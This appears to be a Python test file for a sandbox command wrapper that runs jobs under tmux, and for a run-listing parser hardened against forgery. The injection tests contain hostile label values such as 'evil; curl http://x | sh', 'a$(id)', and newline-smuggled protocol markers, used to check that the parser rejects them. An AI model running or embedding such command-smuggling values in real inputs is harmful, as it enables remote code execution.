"""Functional tests for the rec.sh tmux-supervisor exec core.

These run the real ForceCommand wrapper script with bash against a temp
directory standing in for the sandbox filesystem. The contract under test:

- short commands stay synchronous: exact output bytes, real exit code
- transcript markers keep the parsed format: `[<ts>] $ <cmd>` / `[<ts>] (exit <rc>)`
- commands survive the foreground SSH wrapper being killed (the whole point)
- when tmux is missing or broken, execution falls back open to attached mode
"""

from __future__ import annotations

import os
import shutil
import stat
import subprocess
import tempfile
import time
import unittest
from pathlib import Path

from merv.brain.sandbox.execution.backends.modal.sandbox_backend import (
    MODAL_APT_PACKAGES,
    REC_SCRIPT as MODAL_REC_SCRIPT,
)
from merv.brain.sandbox.execution.backends.lambda_labs.sandbox_backend import (
    LAMBDA_APT_PACKAGES,
)
from merv.brain.sandbox.execution.vm_bootstrap import REC_SCRIPT as LAMBDA_REC_SCRIPT
from merv.brain.sandbox.execution.bootstrap_tools import (
    BASELINE_APT_PACKAGES,
    REC_EXEC_CORE,
)

def _tmux_usable() -> bool:
    executable = shutil.which("tmux")
    if executable is None:
        return False
    probe = subprocess.run(
        [executable, "list-sessions"],
        capture_output=True,
        text=True,
    )
    error = (probe.stderr or "").lower()
    return "operation not permitted" not in error and "permission denied" not in error


HAVE_TMUX = _tmux_usable()


class RecScriptHarness(unittest.TestCase):
    """Run a REC_SCRIPT in a temp sandbox-like environment."""

    rec_script = LAMBDA_REC_SCRIPT

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        root = Path(self.tmp.name)
        self.workdir = root / "exp_t"
        self.data_dir = root / "data"
        self.sessions = root / ".merv_sessions" / "exp_t"
        self.workdir.mkdir()
        self.data_dir.mkdir()
        self.sessions.mkdir(parents=True)
        self.script = root / "rec.sh"
        self.script.write_text(self.rec_script)
        self.script.chmod(self.script.stat().st_mode | stat.S_IXUSR)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    @property
    def transcript(self) -> Path:
        return self.sessions / "transcript.log"

    def env(self, *, path: str | None = None) -> dict[str, str]:
        env = dict(os.environ)
        env.update(
            RP_WORKDIR=str(self.workdir),
            MERV_EXPERIMENT_DIR=str(self.workdir),
            RP_SANDBOX_DATA_DIR=str(self.data_dir),
            RP_SESSION_DIR=str(self.sessions),
            RP_EXPERIMENT_ID="exp_t",
        )
        if path is not None:
            env["PATH"] = path
        return env

    def run_rec(self, command: str, *, env: dict[str, str] | None = None, timeout: float = 30):
        full_env = env or self.env()
        full_env["SSH_ORIGINAL_COMMAND"] = command
        return subprocess.run(
            ["bash", str(self.script)],
            env=full_env,
            capture_output=True,
            text=True,
            timeout=timeout,
        )

    def wait_for(self, predicate, *, timeout: float = 10.0) -> None:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if predicate():
                return
            time.sleep(0.1)
        self.fail("condition not met before timeout")


class TmuxSupervisorTest(RecScriptHarness):
    @unittest.skipUnless(HAVE_TMUX, "tmux unavailable in test environment")
    def test_short_command_synchronous_output_and_exit_code(self) -> None:
        result = self.run_rec("echo hello-from-sandbox; exit 7")
        self.assertEqual(result.returncode, 7)
        self.assertIn("hello-from-sandbox", result.stdout)
        # The supervisor banner goes to stderr, never polluting stdout.
        self.assertIn("under tmux supervisor", result.stderr)
        self.assertNotIn("under tmux supervisor", result.stdout)
        log = self.transcript.read_text()
        self.assertIn("$ echo hello-from-sandbox; exit 7", log)
        self.assertIn("(exit 7)", log)

    @unittest.skipUnless(HAVE_TMUX, "tmux unavailable in test environment")
    def test_run_dir_records_cmd_output_exit_code(self) -> None:
        self.run_rec("printf abc")
        runs = list((self.data_dir / ".merv_runs").iterdir())
        self.assertEqual(len(runs), 1)
        run_dir = runs[0]
        self.assertEqual((run_dir / "cmd").read_text(), "printf abc")
        self.assertEqual((run_dir / "out").read_text(), "abc")
        self.assertEqual((run_dir / "exit_code").read_text().strip(), "0")

    @unittest.skipUnless(HAVE_TMUX, "tmux unavailable in test environment")
    def test_in_command_heredoc_still_works(self) -> None:
        result = self.run_rec('python3 - <<"PY"\nprint(6 * 7)\nPY')
        self.assertEqual(result.returncode, 0)
        self.assertIn("42", result.stdout)

    @unittest.skipUnless(HAVE_TMUX, "tmux unavailable in test environment")
    def test_command_survives_foreground_kill(self) -> None:
        """Kill the SSH-side wrapper mid-run; the command must finish anyway."""
        env = self.env()
        env["SSH_ORIGINAL_COMMAND"] = "sleep 1; echo SURVIVED; exit 5"
        proc = subprocess.Popen(
            ["bash", str(self.script)],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(0.5)  # past tmux launch, before the command completes
        proc.kill()
        proc.wait(timeout=5)
        # The tmux side keeps running and writes output + exit marker to the
        # transcript with nobody connected.
        self.wait_for(lambda: self.transcript.exists() and "SURVIVED" in self.transcript.read_text())
        self.wait_for(lambda: "(exit 5)" in self.transcript.read_text())
        runs = list((self.data_dir / ".merv_runs").iterdir())
        self.assertEqual((runs[0] / "exit_code").read_text().strip(), "5")

    def test_falls_back_attached_when_tmux_broken(self) -> None:
        """A tmux that cannot start sessions must not block execution."""
        shim_dir = Path(self.tmp.name) / "shim"
        shim_dir.mkdir()
        shim = shim_dir / "tmux"
        shim.write_text("#!/bin/sh\nexit 1\n")
        shim.chmod(0o755)
        env = self.env(path=f"{shim_dir}:{os.environ['PATH']}")
        result = self.run_rec("echo fallback-ran; exit 3", env=env)
        self.assertEqual(result.returncode, 3)
        self.assertIn("fallback-ran", result.stdout)
        log = self.transcript.read_text()
        self.assertIn("(exit 3)", log)
        # No run dir: the supervisor path was never entered.
        self.assertEqual(list((self.data_dir / ".merv_runs").glob("*/exit_code")), [])


class ModalRecScriptTest(RecScriptHarness):
    rec_script = MODAL_REC_SCRIPT

    @unittest.skipUnless(HAVE_TMUX, "tmux unavailable in test environment")
    def test_short_command_synchronous_output_and_exit_code(self) -> None:
        result = self.run_rec("echo modal-cmd; exit 4")
        self.assertEqual(result.returncode, 4)
        self.assertIn("modal-cmd", result.stdout)
        self.assertIn("(exit 4)", self.transcript.read_text())


class RecScriptContractTest(unittest.TestCase):
    def test_tmux_ships_in_both_backends_bootstrap(self) -> None:
        self.assertIn("tmux", BASELINE_APT_PACKAGES)
        self.assertIn("tmux", LAMBDA_APT_PACKAGES)
        self.assertIn("tmux", MODAL_APT_PACKAGES)

    def test_both_rec_scripts_embed_the_supervisor_core(self) -> None:
        for script in (LAMBDA_REC_SCRIPT, MODAL_REC_SCRIPT):
            self.assertIn(REC_EXEC_CORE, script)
            self.assertIn("tmux new-session", script)
            self.assertIn("rp_exec_attached", script)

    def test_modal_bypasses_file_transfer_protocols(self) -> None:
        self.assertIn(r"rsync\ --server*", MODAL_REC_SCRIPT)
        # Bypass must come before the supervisor core touches the command.
        self.assertLess(
            MODAL_REC_SCRIPT.index("rsync"),
            MODAL_REC_SCRIPT.index("tmux new-session"),
        )


if __name__ == "__main__":
    unittest.main()


class ListingFramingTest(unittest.TestCase):
    """The listing wire format must be unforgeable by the sandbox.

    A .runs/ directory can be created by anything with write access to the
    workdir, and it supplies its own name, meta.json, exit_code and
    finished_at. If any of those reach the stream raw, one of them can carry a
    newline plus a `===MERV_RUN ` line and synthesize a block for a DIFFERENT
    label — and because _record fills any row whose exit_code is still NULL,
    that forges a completion for a job that is still running.
    """

    @staticmethod
    def _b64(text: str) -> str:
        import base64

        return base64.b64encode(text.encode("utf-8")).decode("ascii")

    def _emit(self, label: str, *, meta: str = "{}", exit_code: str = "", fin: str = "") -> str:
        return (
            f"===MERV_RUN {self._b64(label)}\n"
            f"===META {self._b64(meta)}\n"
            f"===EXIT {self._b64(exit_code)}\n"
            f"===FIN {self._b64(fin)}\n"
        )

    def test_newline_in_directory_name_cannot_forge_a_block(self) -> None:
        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing

        # An ACTUAL newline — legal in a Linux directory name.
        hostile = 'evil\n===MERV_RUN seed0\n===EXIT 0\n'
        stream = (
            self._emit("seed0", meta='{"command":"REAL"}')
            + self._emit(hostile, exit_code="0")
        )
        parsed = parse_runs_listing(stream)
        self.assertEqual([r["label"] for r in parsed], ["seed0"])
        self.assertEqual(parsed[0]["command"], "REAL")
        self.assertIsNone(parsed[0]["exit_code"])

    def test_marker_inside_meta_json_cannot_forge_a_block(self) -> None:
        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing

        stream = (
            self._emit("seed0", meta='{"command":"REAL"}')
            + self._emit("evil", meta='===MERV_RUN c2VlZDA=\n===EXIT MA==\n')
        )
        parsed = parse_runs_listing(stream)
        self.assertEqual([r["label"] for r in parsed], ["seed0", "evil"])
        self.assertIsNone(parsed[0]["exit_code"])

    def test_marker_inside_exit_code_file_cannot_forge_a_block(self) -> None:
        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing

        stream = (
            self._emit("seed0", meta='{"command":"REAL"}')
            + self._emit("evil", exit_code='0\n===MERV_RUN c2VlZDA=\n===EXIT MA==\n')
        )
        parsed = parse_runs_listing(stream)
        self.assertEqual([r["label"] for r in parsed], ["seed0", "evil"])
        self.assertIsNone(parsed[0]["exit_code"])

    def test_shell_metacharacter_labels_are_dropped(self) -> None:
        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing

        for hostile in ("evil; curl http://x | sh", "a`id`", "a$(id)", "a b", " seed0 "):
            with self.subTest(label=hostile):
                self.assertEqual(parse_runs_listing(self._emit(hostile)), [])

    def test_legitimate_labels_round_trip(self) -> None:
        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing

        for good in ("seed0", "qpf_rest", "tier-1.2", "A_b-c.9"):
            with self.subTest(label=good):
                parsed = parse_runs_listing(
                    self._emit(good, meta='{"command":"c","pid":7,"started_at":"t"}',
                               exit_code="3", fin="2026-01-01T00:00:00Z")
                )
                self.assertEqual(len(parsed), 1)
                self.assertEqual(parsed[0]["label"], good)
                self.assertEqual(parsed[0]["exit_code"], 3)
                self.assertEqual(parsed[0]["pid"], 7)

    def test_the_emitted_shell_command_base64s_every_field(self) -> None:
        from merv.brain.sandbox.execution.run_receipts import runs_listing_command

        cmd = runs_listing_command(experiment_dir="/workspace/exp")
        for field in ("meta.json", "exit_code", "finished_at"):
            with self.subTest(field=field):
                segment = cmd.split(field, 1)[1].split(";", 1)[0]
                self.assertIn("base64", segment)
        # The label uses shell parameter expansion, not basename: basename
        # appends a newline and $() strips trailing ones, which would normalize
        # a hostile "seed0\n" directory onto the real seed0 row.
        self.assertNotIn("basename", cmd)
        self.assertIn("b=${r%/}; b=${b##*/}", cmd)

    def test_dot_prefixed_labels_are_observed(self) -> None:
        """merv_run accepts a leading dot, so the observer must see it.

        The launcher's charset permits `.hidden`, and it happily creates
        .runs/.hidden/ — but a bare `*/` glob never matches a dot-name, so the
        run existed and was invisible: no receipt, no exit code, no event.
        """
        import os
        import shutil
        import subprocess
        import tempfile

        from merv.brain.sandbox.execution.run_receipts import (
            parse_runs_listing,
            runs_listing_command,
        )

        root = tempfile.mkdtemp()
        try:
            runs = os.path.join(root, ".runs")
            for name in (".hidden", "plain", "..odd"):
                os.makedirs(os.path.join(runs, name))
                with open(os.path.join(runs, name, "exit_code"), "w") as handle:
                    handle.write("0\n")
            out = subprocess.run(
                ["sh", "-c", runs_listing_command(experiment_dir=root)],
                capture_output=True, text=True, timeout=10,
            )
            self.assertEqual(out.returncode, 0, out.stderr)
            seen = {r["label"] for r in parse_runs_listing(out.stdout)}
            self.assertEqual(seen, {".hidden", "plain", "..odd"})
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_a_long_command_survives_the_meta_cap(self) -> None:
        """A truncated meta.json is invalid JSON and loses command/pid/started_at."""
        import json
        import os
        import shutil
        import subprocess
        import tempfile

        from merv.brain.sandbox.execution.run_receipts import (
            parse_runs_listing,
            runs_listing_command,
        )

        root = tempfile.mkdtemp()
        try:
            run_dir = os.path.join(root, ".runs", "seed0")
            os.makedirs(run_dir)
            long_cmd = "python train.py " + " ".join(
                f"--flag{i}=value{i}" for i in range(1200)
            )
            self.assertGreater(len(long_cmd), 8192)  # would have truncated before
            with open(os.path.join(run_dir, "meta.json"), "w") as handle:
                json.dump(
                    {"label": "seed0", "command": long_cmd, "pid": 42,
                     "started_at": "2026-07-05T10:00:00Z"}, handle,
                )
            out = subprocess.run(
                ["sh", "-c", runs_listing_command(experiment_dir=root)],
                capture_output=True, text=True, timeout=10,
            )
            parsed = parse_runs_listing(out.stdout)
            self.assertEqual(len(parsed), 1)
            self.assertEqual(parsed[0]["command"], long_cmd)
            self.assertEqual(parsed[0]["pid"], 42)
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_invalid_utf8_in_meta_degrades_rather_than_losing_the_record(self) -> None:
        """A byte-based cut can split a multibyte character on the box.

        The parser decodes with errors="replace", so the receipt survives with
        one replacement character instead of the whole record being dropped.
        Pinned so that resilience is not refactored away.
        """
        import base64

        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing

        split = b'{"label":"seed0","command":"caf\xc3","pid":7,"started_at":"t"}'
        stream = (
            "===MERV_RUN " + base64.b64encode(b"seed0").decode() + "\n"
            "===META " + base64.b64encode(split).decode() + "\n"
            "===EXIT " + base64.b64encode(b"0").decode() + "\n"
            "===FIN " + base64.b64encode(b"t").decode() + "\n"
        )
        parsed = parse_runs_listing(stream)
        self.assertEqual(len(parsed), 1)
        self.assertEqual(parsed[0]["pid"], 7)
        self.assertEqual(parsed[0]["exit_code"], 0)
